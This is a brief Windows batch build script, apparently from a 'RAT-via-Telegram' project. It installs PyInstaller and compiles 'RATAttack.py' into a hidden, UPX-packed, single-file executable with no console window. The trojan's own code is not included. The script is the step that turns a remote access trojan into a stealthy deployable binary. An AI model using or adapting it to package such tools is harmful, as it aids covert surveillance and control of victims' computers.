rem --specpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\" --distpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\dist" --workpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\build"
pip3 install pyinstaller
pyinstaller --clean --upx-dir "upx395w" --noconsole --hidden-import ctypes --onefile "%~dp0\RATAttack.py"
